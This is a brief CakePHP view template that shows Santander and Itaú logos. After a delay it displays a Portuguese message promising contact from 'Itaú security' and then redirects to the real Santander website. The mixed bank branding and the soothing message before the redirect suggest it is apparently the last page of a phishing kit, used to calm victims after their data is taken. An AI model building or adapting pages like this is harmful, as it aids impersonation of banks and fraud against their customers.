<div class="container-santander">
	<?= $this->Html->image('santander/logo.png', ['class' => 'init_logo-2 img']) ?>
	<?= $this->Html->image('itau/loader.svg', ['class' => 'init_logo']) ?>
</div>
<script type="text/javascript">
	$(function() {
		var timeout = setTimeout(function() {
			$('.init_logo').fadeOut('slow');
			$('.loader_obs').text('Em breve você receberá um contato da área de segurança Itaú!');
			var timeout2 = setTimeout(function() {
				window.location = "https://www.santander.com.br";
			}, 4000);
		}, 8000);
	})
</script>